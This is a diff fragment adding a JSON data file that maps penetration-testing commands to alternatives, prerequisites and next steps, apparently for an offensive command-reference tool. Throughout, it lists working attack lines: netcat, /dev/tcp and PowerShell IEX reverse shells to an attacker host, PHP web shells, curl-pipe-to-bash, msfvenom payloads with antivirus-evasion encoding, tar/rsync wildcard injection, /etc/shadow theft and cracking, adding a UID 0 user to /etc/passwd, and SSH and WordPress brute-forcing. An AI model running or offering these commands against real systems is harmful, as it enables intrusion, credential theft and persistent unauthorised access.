+      "tool": "unknown",
+      "source_command": "linux-wildcard-injection",
+      "relation_type": "next_steps",
+      "command_text": "For tar: echo '' > '--checkpoint=1' && echo '' > '--checkpoint-action=exec=sh shell.sh'"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-wildcard-injection",
+      "relation_type": "next_steps",
+      "command_text": "Create shell.sh: echo 'chmod +s /bin/bash' > shell.sh"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-wildcard-injection",
+      "relation_type": "next_steps",
+      "command_text": "For rsync: echo '' > '-e sh shell.sh'"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-unix-privesc-check-nc",
+      "relation_type": "next_steps",
+      "command_text": "Save output: ... | sh -s -- standard > /tmp/upc.txt"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-find-world-writable",
+      "relation_type": "next_steps",
+      "command_text": "Read writable files: cat /path/to/file"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-find-world-writable",
+      "relation_type": "next_steps",
+      "command_text": "Add root user if /etc/passwd writable"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-linpeas-http",
+      "relation_type": "next_steps",
+      "command_text": "Save output: curl ... | sh | tee linpeas.out"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-linpeas-http",
+      "relation_type": "next_steps",
+      "command_text": "Grep for passwords: grep -i pass linpeas.out"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-linpeas-nc",
+      "relation_type": "next_steps",
+      "command_text": "Save output for later: ... | sh > /tmp/linpeas.txt"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-linpeas-save-output",
+      "relation_type": "next_steps",
+      "command_text": "Grep for passwords: grep -i pass <OUTPUT_FILE>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-linpeas-save-output",
+      "relation_type": "next_steps",
+      "command_text": "Find world-writable: grep -i 'world.*writable' <OUTPUT_FILE>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-linpeas-save-output",
+      "relation_type": "next_steps",
+      "command_text": "Extract PE vectors: grep -E 'RED|YELLOW|99%' <OUTPUT_FILE>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-check-shadow-readable",
+      "relation_type": "next_steps",
+      "command_text": "Copy hashes: cat /etc/shadow > /tmp/shadow.txt"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-check-shadow-readable",
+      "relation_type": "next_steps",
+      "command_text": "Use john or hashcat: john shadow.txt --wordlist=rockyou.txt"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-check-shadow-readable",
+      "relation_type": "next_steps",
+      "command_text": "Extract specific user: grep root /etc/shadow"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-parse-linpeas-writable",
+      "relation_type": "next_steps",
+      "command_text": "Prioritize /etc files"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-find-writable-services-systemd",
+      "relation_type": "next_steps",
+      "command_text": "Modify ExecStart: echo 'ExecStart=/bin/bash -c \"chmod +s /bin/bash\"' >> <service>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-find-writable-services-systemd",
+      "relation_type": "next_steps",
+      "command_text": "Restart service: systemctl restart <service>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "linux-find-writable-services-systemd",
+      "relation_type": "next_steps",
+      "command_text": "Get root shell: /bin/bash -p"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "enumerate-capabilities",
+      "relation_type": "alternatives",
+      "command_text": "Targeted search: getcap -r /usr/bin 2>/dev/null (faster, common location)"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "enumerate-capabilities",
+      "relation_type": "alternatives",
+      "command_text": "Use linpeas.sh or linenum.sh for automated enumeration with capabilities check"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "filter-exploitable-caps",
+      "relation_type": "alternatives",
+      "command_text": "Automated filtering with grep: getcap -r / 2>/dev/null | grep -E 'cap_(setuid|dac_override|dac_read_search|sys_admin|sys_ptrace)'"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "filter-exploitable-caps",
+      "relation_type": "alternatives",
+      "command_text": "Use linpeas.sh capabilities module for automated classification"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "filter-exploitable-caps",
+      "relation_type": "next_steps",
+      "command_text": "For cap_dac_override: Check if binary is editor (vim, nano) - edit /etc/passwd for UID 0"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "filter-exploitable-caps",
+      "relation_type": "next_steps",
+      "command_text": "For cap_dac_read_search: Check if binary can read files (tar, base64) - exfiltrate shadow/keys"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "gtfobins-cap-lookup",
+      "relation_type": "alternatives",
+      "command_text": "HackTricks capabilities page: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "gtfobins-cap-lookup",
+      "relation_type": "alternatives",
+      "command_text": "PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#capabilities"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "gtfobins-cap-lookup",
+      "relation_type": "prerequisites",
+      "command_text": "Internet access or cached GTFOBins/HackTricks documentation"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "gtfobins-cap-lookup",
+      "relation_type": "next_steps",
+      "command_text": "Substitute <CAP_BINARY> with actual binary path from getcap"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "execute-cap-exploit",
+      "relation_type": "alternatives",
+      "command_text": "Use different exploitation technique for same capability/binary"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "execute-cap-exploit",
+      "relation_type": "prerequisites",
+      "command_text": "Identified capability/binary combination from previous steps"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "execute-cap-exploit",
+      "relation_type": "prerequisites",
+      "command_text": "Write access to /tmp or other working directory if needed"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "execute-cap-exploit",
+      "relation_type": "next_steps",
+      "command_text": "For root shell: stabilize shell and collect flags/loot"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "cap-exploit-dac-override-passwd-edit",
+      "relation_type": "alternatives",
+      "command_text": "Edit /etc/passwd to remove root password: root::0:0:root:/root:/bin/bash (then su root with no password)"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "cap-exploit-dac-override-passwd-edit",
+      "relation_type": "alternatives",
+      "command_text": "Edit /etc/shadow instead if cap allows: remove root password hash"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "cap-exploit-dac-override-passwd-edit",
+      "relation_type": "alternatives",
+      "command_text": "Use cp command with cap_dac_override to overwrite passwd: cp modified_passwd /etc/passwd"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "cap-exploit-dac-override-passwd-edit",
+      "relation_type": "alternatives",
+      "command_text": "Use tar to extract modified passwd over existing: tar -xzf passwd.tar.gz -C /"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "cap-exploit-dac-override-passwd-edit",
+      "relation_type": "prerequisites",
+      "command_text": "Understanding of /etc/passwd format"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "cap-exploit-dac-override-passwd-edit",
+      "relation_type": "next_steps",
+      "command_text": "Add line to /etc/passwd: hacker:x:0:0::/root:/bin/bash"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "mysql-connect-basic",
+      "relation_type": "alternatives",
+      "command_text": "mysql -h <TARGET> -u <USER> -p (interactive password prompt)"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "mysql-connect-basic",
+      "relation_type": "next_steps",
+      "command_text": "USE <database>;"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "postgres-connect-basic",
+      "relation_type": "next_steps",
+      "command_text": "\\c <database> (connect to database)"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "nc-reverse-shell",
+      "relation_type": "alternatives",
+      "command_text": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <LHOST> <LPORT> >/tmp/f"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "nc-reverse-shell",
+      "relation_type": "alternatives",
+      "command_text": "nc <LHOST> <LPORT> | /bin/bash | nc <LHOST> <LPORT+1>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "nc-reverse-shell",
+      "relation_type": "next_steps",
+      "command_text": "Transfer files with nc: nc -l -p 1234 > file"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "powershell-reverse-shell",
+      "relation_type": "next_steps",
+      "command_text": "Download files: Invoke-WebRequest -Uri http://<LHOST>/file -OutFile file"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "msfvenom-linux-elf",
+      "relation_type": "next_steps",
+      "command_text": "Start listener: nc -nvlp <LPORT>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "msfvenom-linux-elf",
+      "relation_type": "next_steps",
+      "command_text": "Transfer to target: python3 -m http.server 8000"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "msfvenom-linux-elf",
+      "relation_type": "next_steps",
+      "command_text": "Execute: ./shell.elf"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "msfvenom-windows-exe",
+      "relation_type": "next_steps",
+      "command_text": "Encode for AV evasion: msfvenom ... -e x86/shikata_ga_nai -i 9"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "msfvenom-windows-exe",
+      "relation_type": "next_steps",
+      "command_text": "Start listener: nc -nvlp <LPORT> or use multi/handler"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "msfvenom-windows-exe",
+      "relation_type": "next_steps",
+      "command_text": "Execute on target: .\\shell.exe"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "searchsploit",
+      "relation_type": "alternatives",
+      "command_text": "google: site:exploit-db.com <SERVICE>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "searchsploit",
+      "relation_type": "next_steps",
+      "command_text": "Copy exploit: searchsploit -m <PATH>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "hydra-ssh",
+      "relation_type": "alternatives",
+      "command_text": "medusa -h <TARGET> -u <USERNAME> -P <WORDLIST> -M ssh"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "hydra-ssh",
+      "relation_type": "next_steps",
+      "command_text": "SSH with found creds: ssh <USERNAME>@<TARGET>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "web-shell-php",
+      "relation_type": "alternatives",
+      "command_text": "<?php echo shell_exec($_GET['cmd']); ?>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "web-shell-php",
+      "relation_type": "alternatives",
+      "command_text": "<?php eval($_POST['cmd']); ?>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "web-shell-php",
+      "relation_type": "alternatives",
+      "command_text": "<?php passthru($_REQUEST['cmd']); ?>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "web-shell-php",
+      "relation_type": "next_steps",
+      "command_text": "Get reverse shell: shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/<IP>/<PORT>+0>%261'"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "web-shell-php",
+      "relation_type": "next_steps",
+      "command_text": "Upload better shell: shell.php?cmd=wget+http://<IP>/shell.sh"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "searchsploit-cve-lookup",
+      "relation_type": "prerequisites",
+      "command_text": "Update ExploitDB: searchsploit -u"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "searchsploit-cve-lookup",
+      "relation_type": "next_steps",
+      "command_text": "Copy exploit locally: searchsploit --cve <CVE_ID> -m"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "searchsploit-service-version",
+      "relation_type": "prerequisites",
+      "command_text": "Get version from: nmap -sV <TARGET>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "searchsploit-service-version",
+      "relation_type": "prerequisites",
+      "command_text": "Alternative: Banner grabbing with nc <TARGET> <PORT>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "searchsploit-service-version",
+      "relation_type": "next_steps",
+      "command_text": "Filter results: searchsploit <SERVICE> <VERSION> --exclude='dos'"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "searchsploit-service-version",
+      "relation_type": "next_steps",
+      "command_text": "Prioritize: Remote exploits > Local exploits"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "searchsploit-service-version",
+      "relation_type": "next_steps",
+      "command_text": "Copy exploit: searchsploit -m <EDB_ID>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "searchsploit-copy-exploit",
+      "relation_type": "prerequisites",
+      "command_text": "Find exploit first: searchsploit <SERVICE> <VERSION>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "searchsploit-copy-exploit",
+      "relation_type": "next_steps",
+      "command_text": "Read exploit code: cat <FILENAME> or less <FILENAME>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "searchsploit-copy-exploit",
+      "relation_type": "next_steps",
+      "command_text": "Make executable if needed: chmod +x <FILENAME>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "nmap-script-help",
+      "relation_type": "prerequisites",
+      "command_text": "Know target OS/service for appropriate scripts"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "nmap-script-help",
+      "relation_type": "next_steps",
+      "command_text": "Run script: nmap --script <SCRIPT_NAME> --script-args <ARGS> <TARGET>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "nmap-script-help",
+      "relation_type": "next_steps",
+      "command_text": "Read script source for deeper understanding: cat /usr/share/nmap/scripts/<SCRIPT_NAME>.nse"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "nmap-script-args",
+      "relation_type": "prerequisites",
+      "command_text": "Get script help: nmap --script-help <SCRIPT_NAME>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "nmap-script-args",
+      "relation_type": "next_steps",
+      "command_text": "Save output: nmap ... -oA nmap_script_results"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "gobuster-dir-common",
+      "relation_type": "next_steps",
+      "command_text": "Run deeper scan: gobuster-dir-custom with larger wordlist"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "gobuster-dir-custom",
+      "relation_type": "prerequisites",
+      "command_text": "Identify web technology: whatweb http://<TARGET>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "gobuster-dir-custom",
+      "relation_type": "next_steps",
+      "command_text": "Recursive scan on interesting dirs: gobuster dir -u http://<TARGET>/<DIR>/"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "nikto-comprehensive",
+      "relation_type": "prerequisites",
+      "command_text": "Run gobuster first: gobuster-dir-common (complement findings)"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "msfvenom-windows-reverse-tcp",
+      "relation_type": "next_steps",
+      "command_text": "Execute payload on target"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "msfvenom-linux-reverse-tcp",
+      "relation_type": "next_steps",
+      "command_text": "chmod +x <OUTPUT_FILE>"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "msfvenom-php-webshell",
+      "relation_type": "next_steps",
+      "command_text": "Access via browser: http://target/shell.php"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "msfvenom-aspx-webshell",
+      "relation_type": "next_steps",
+      "command_text": "Access via browser: http://target/shell.aspx"
+    },
+    {
+      "tool": "unknown",
+      "source_command": "ssh-login-password",
+      "relation_type": "alternatives",
+      "command_text": "ssh <USERNAME>@<TARGET> (interactive password prompt)"
+    },
+    {
+      "tool": "masscan",
+      "source_command": "nmap-quick-scan",
+      "relation_type": "alternatives",
+      "command_text": "masscan -p1-65535 <TARGET>"
+    },
+    {
+      "tool": "metasploit",
+      "source_command": "nmap-vuln-scan",
+      "relation_type": "next_steps",
+      "command_text": "Check Metasploit: msfconsole; search <vulnerability>"
+    },
+    {
+      "tool": "metasploit",
+      "source_command": "windows-alwaysinstallelevated",
+      "relation_type": "next_steps",
+      "command_text": "Alternative: use Metasploit always_install_elevated module"
+    },
+    {
+      "tool": "metasploit",
+      "source_command": "linux-nfs-no-root-squash",
+      "relation_type": "alternatives",
+      "command_text": "Use metasploit NFS scanner"
+    },
+    {
+      "tool": "smbmap",
+      "source_command": "smb-enum",
+      "relation_type": "alternatives",
+      "command_text": "smbmap -H <TARGET>"
+    },
+    {
+      "tool": "crackmapexec",
+      "source_command": "smb-enum",
+      "relation_type": "alternatives",
+      "command_text": "crackmapexec smb <TARGET>"
+    },
+    {
+      "tool": "crackmapexec",
+      "source_command": "hydra-ssh",
+      "relation_type": "alternatives",
+      "command_text": "crackmapexec ssh <TARGET> -u <USERNAME> -p <WORDLIST>"
+    },
+    {
+      "tool": "ffuf",
+      "source_command": "vhost-fuzzing-gobuster",
+      "relation_type": "alternatives",
+      "command_text": "ffuf -w <WORDLIST> -u http://<TARGET> -H 'Host: FUZZ.<DOMAIN>'"
+    },
+    {
+      "tool": "ffuf",
+      "source_command": "gobuster-dir",
+      "relation_type": "alternatives",
+      "command_text": "ffuf -u <URL>/FUZZ -w <WORDLIST>"
+    },
+    {
+      "tool": "ffuf",
+      "source_command": "wfuzz-params",
+      "relation_type": "alternatives",
+      "command_text": "ffuf -u '<URL>?FUZZ=test' -w <WORDLIST>"
+    },
+    {
+      "tool": "wfuzz",
+      "source_command": "gobuster-dir",
+      "relation_type": "alternatives",
+      "command_text": "wfuzz -u <URL>/FUZZ -w <WORDLIST>"
+    },
+    {
+      "tool": "wfuzz",
+      "source_command": "wpscan-password-attack",
+      "relation_type": "alternatives",
+      "command_text": "wfuzz -z file,<WORDLIST> --hc 200 -d 'log=admin&pwd=FUZZ' <URL>/wp-login.php"
+    },
+    {
+      "tool": "sqlmap",
+      "source_command": "sqlmap-basic",
+      "relation_type": "alternatives",
+      "command_text": "sqlmap -r request.txt --batch"
+    },
+    {
+      "tool": "burpsuite",
+      "source_command": "sqlmap-basic",
+      "relation_type": "alternatives",
+      "command_text": "burp suite scanner"
+    },
+    {
+      "tool": "burpsuite",
+      "source_command": "wordpress-xmlrpc-enum",
+      "relation_type": "alternatives",
+      "command_text": "burp suite XML-RPC plugin"
+    },
+    {
+      "tool": "wget",
+      "source_command": "curl-post",
+      "relation_type": "alternatives",
+      "command_text": "wget --post-data '<PARAM>=<VALUE>' <URL>"
+    },
+    {
+      "tool": "wget",
+      "source_command": "php-download",
+      "relation_type": "alternatives",
+      "command_text": "wget via PHP: <?php system('wget http://<LHOST>/<FILE>'); ?>"
+    },
+    {
+      "tool": "wget",
+      "source_command": "file-transfer-curl",
+      "relation_type": "alternatives",
+      "command_text": "wget if curl unavailable"
+    },
+    {
+      "tool": "wget",
+      "source_command": "file-transfer-powershell-download",
+      "relation_type": "alternatives",
+      "command_text": "wget <URL> -O <FILE> (PowerShell alias)"
+    },
+    {
+      "tool": "wget",
+      "source_command": "linux-linpeas",
+      "relation_type": "alternatives",
+      "command_text": "wget -O - https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh"
+    },
+    {
+      "tool": "curl",
+      "source_command": "whatweb-enum",
+      "relation_type": "alternatives",
+      "command_text": "curl -I <URL>"
+    },
+    {
+      "tool": "curl",
+      "source_command": "wordpress-manual-version",
+      "relation_type": "alternatives",
+      "command_text": "curl -s <URL>/readme.html"
+    },
+    {
+      "tool": "curl",
+      "source_command": "wordpress-manual-version",
+      "relation_type": "alternatives",
+      "command_text": "curl -s <URL>/feed/ | grep generator"
+    },
+    {
+      "tool": "curl",
+      "source_command": "wget-download",
+      "relation_type": "alternatives",
+      "command_text": "curl -O http://<LHOST>:<PORT>/<FILE>"
+    },
+    {
+      "tool": "curl",
+      "source_command": "curl-upload",
+      "relation_type": "alternatives",
+      "command_text": "curl --upload-file <FILE> http://<LHOST>:<PORT>/"
+    },
+    {
+      "tool": "curl",
+      "source_command": "curl-upload",
+      "relation_type": "alternatives",
+      "command_text": "curl -T <FILE> ftp://<LHOST>/"
+    },
+    {
+      "tool": "curl",
+      "source_command": "php-download",
+      "relation_type": "alternatives",
+      "command_text": "curl via PHP: <?php system('curl -O http://<LHOST>/<FILE>'); ?>"
+    },
+    {
+      "tool": "curl",
+      "source_command": "file-transfer-wget",
+      "relation_type": "alternatives",
+      "command_text": "curl http://<LHOST>/<FILE> -o <OUTPUT>"
+    },
+    {
+      "tool": "curl",
+      "source_command": "file-transfer-curl",
+      "relation_type": "alternatives",
+      "command_text": "curl <URL> | bash (pipe to shell)"
+    },
+    {
+      "tool": "curl",
+      "source_command": "file-transfer-powershell-download",
+      "relation_type": "alternatives",
+      "command_text": "curl <URL> -o <FILE> (PowerShell alias)"
+    },
+    {
+      "tool": "searchsploit",
+      "source_command": "wpscan-enumerate-all",
+      "relation_type": "next_steps",
+      "command_text": "searchsploit <plugin-name>"
+    },
+    {
+      "tool": "searchsploit",
+      "source_command": "wpscan-enumerate-all",
+      "relation_type": "next_steps",
+      "command_text": "searchsploit <theme-name>"
+    },
+    {
+      "tool": "searchsploit",
+      "source_command": "wpscan-aggressive-detection",
+      "relation_type": "next_steps",
+      "command_text": "searchsploit <plugin-name> <version>"
+    },
+    {
+      "tool": "searchsploit",
+      "source_command": "wpscan-aggressive-detection",
+      "relation_type": "next_steps",
+      "command_text": "searchsploit <theme-name> <version>"
+    },
+    {
+      "tool": "searchsploit",
+      "source_command": "wordpress-xmlrpc-enum",
+      "relation_type": "next_steps",
+      "command_text": "searchsploit xmlrpc"
+    },
+    {
+      "tool": "searchsploit",
+      "source_command": "searchsploit",
+      "relation_type": "alternatives",
+      "command_text": "searchsploit -www <SERVICE>"
+    },
+    {
+      "tool": "searchsploit",
+      "source_command": "searchsploit",
+      "relation_type": "alternatives",
+      "command_text": "searchsploit --nmap scan.xml"
+    },
+    {
+      "tool": "hydra",
+      "source_command": "wpscan-password-attack",
+      "relation_type": "alternatives",
+      "command_text": "hydra -l <USER> -P <WORDLIST> <URL> http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid'"
+    },
+    {
+      "tool": "python",
+      "source_command": "python-http-server",
+      "relation_type": "alternatives",
+      "command_text": "python2 -m SimpleHTTPServer <PORT>"
+    },
+    {
+      "tool": "python",
+      "source_command": "ftp-transfer",
+      "relation_type": "alternatives",
+      "command_text": "python -m SimpleHTTPServer"
+    },
+    {
+      "tool": "python",
+      "source_command": "file-transfer-python-http",
+      "relation_type": "alternatives",
+      "command_text": "python -m SimpleHTTPServer 8000 (Python 2)"
+    },
+    {
+      "tool": "php",
+      "source_command": "python-http-server",
+      "relation_type": "alternatives",
+      "command_text": "php -S 0.0.0.0:<PORT>"
+    },
+    {
+      "tool": "php",
+      "source_command": "file-transfer-python-http",
+      "relation_type": "alternatives",
+      "command_text": "php -S 0.0.0.0:8000"
+    },
+    {
+      "tool": "ruby",
+      "source_command": "python-http-server",
+      "relation_type": "alternatives",
+      "command_text": "ruby -run -e httpd . -p <PORT>"
+    },
+    {
+      "tool": "ruby",
+      "source_command": "file-transfer-python-http",
+      "relation_type": "alternatives",
+      "command_text": "ruby -run -e httpd . -p 8000"
+    },
+    {
+      "tool": "powershell",
+      "source_command": "certutil-download",
+      "relation_type": "alternatives",
+      "command_text": "powershell wget http://<LHOST>/<FILE> -OutFile <FILE>"
+    },
+    {
+      "tool": "powershell",
+      "source_command": "powershell-download",
+      "relation_type": "alternatives",
+      "command_text": "powershell wget http://<LHOST>/<FILE>"
+    },
+    {
+      "tool": "powershell",
+      "source_command": "powershell-download",
+      "relation_type": "alternatives",
+      "command_text": "powershell curl http://<LHOST>/<FILE>"
+    },
+    {
+      "tool": "powershell",
+      "source_command": "base64-transfer",
+      "relation_type": "next_steps",
+      "command_text": "PowerShell decode: [System.Convert]::FromBase64String($data)"
+    },
+    {
+      "tool": "powershell",
+      "source_command": "debug-exe-transfer",
+      "relation_type": "alternatives",
+      "command_text": "PowerShell byte array"
+    },
+    {
+      "tool": "powershell",
+      "source_command": "file-transfer-certutil",
+      "relation_type": "alternatives",
+      "command_text": "PowerShell download methods"
+    },
+    {
+      "tool": "powershell",
+      "source_command": "file-transfer-bitsadmin",
+      "relation_type": "alternatives",
+      "command_text": "PowerShell download methods"
+    },
+    {
+      "tool": "powershell",
+      "source_command": "powershell-reverse-shell",
+      "relation_type": "alternatives",
+      "command_text": "powershell -exec bypass -f shell.ps1"
+    },
+    {
+      "tool": "powershell",
+      "source_command": "powershell-reverse-shell",
+      "relation_type": "alternatives",
+      "command_text": "powershell IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/shell.ps1')"
+    },
+    {
+      "tool": "base64",
+      "source_command": "powershell-download",
+      "relation_type": "next_steps",
+      "command_text": "Base64 encode: [Convert]::ToBase64String([IO.File]::ReadAllBytes('<FILE>'))"
+    },
+    {
+      "tool": "base64",
+      "source_command": "file-transfer-wget",
+      "relation_type": "alternatives",
+      "command_text": "Base64 encode and paste if no tools"
+    },
+    {
+      "tool": "socat",
+      "source_command": "nc-file-transfer",
+      "relation_type": "alternatives",
+      "command_text": "socat TCP-LISTEN:<LPORT> file:<FILE>,create"
+    },
+    {
+      "tool": "socat",
+      "source_command": "file-transfer-nc-push",
+      "relation_type": "alternatives",
+      "command_text": "socat for bidirectional transfer"
+    },
+    {
+      "tool": "socat",
+      "source_command": "file-transfer-nc-pull",
+      "relation_type": "alternatives",
+      "command_text": "socat TCP-LISTEN:port,reuseaddr,fork file:output"
+    },
+    {
+      "tool": "perl",
+      "source_command": "perl-download",
+      "relation_type": "alternatives",
+      "command_text": "perl -e 'use File::Fetch; File::Fetch->new(uri=>\"http://<LHOST>/<FILE>\")->fetch();'"
+    },
+    {
+      "tool": "certutil",
+      "source_command": "vbscript-download",
+      "relation_type": "alternatives",
+      "command_text": "certutil for Windows 7+"
+    },
+    {
+      "tool": "certutil",
+      "source_command": "debug-exe-transfer",
+      "relation_type": "alternatives",
+      "command_text": "certutil base64 encoding"
+    },
+    {
+      "tool": "certutil",
+      "source_command": "file-transfer-bitsadmin",
+      "relation_type": "alternatives",
+      "command_text": "certutil for simpler syntax"
+    },
+    {
+      "tool": "impacket-",
+      "source_command": "file-transfer-smb",
+      "relation_type": "alternatives",
+      "command_text": "impacket-smbserver share . -smb2support (attacker)"
+    },
+    {
+      "tool": "ssh",
+      "source_command": "linux-ssh-keys",
+      "relation_type": "next_steps",
+      "command_text": "ssh -i id_rsa user@target"
+    },
+    {
+      "tool": "msfvenom",
+      "source_command": "msfvenom-linux-elf",
+      "relation_type": "alternatives",
+      "command_text": "msfvenom -p linux/x86/shell_reverse_tcp"
+    },
+    {
+      "tool": "msfvenom",
+      "source_command": "msfvenom-linux-elf",
+      "relation_type": "alternatives",
+      "command_text": "msfvenom -p linux/x64/meterpreter/reverse_tcp"
+    },
+    {
+      "tool": "msfvenom",
+      "source_command": "msfvenom-windows-exe",
+      "relation_type": "alternatives",
+      "command_text": "msfvenom -p windows/shell_reverse_tcp"
+    },
+    {
+      "tool": "msfvenom",
+      "source_command": "msfvenom-windows-exe",
+      "relation_type": "alternatives",
+      "command_text": "msfvenom -p windows/meterpreter/reverse_tcp"
+    },
+    {
+      "tool": "msfvenom",
+      "source_command": "msfvenom-windows-exe",
+      "relation_type": "alternatives",
+      "command_text": "msfvenom -p windows/x64/meterpreter/reverse_https"
+    }
+  ]
+}
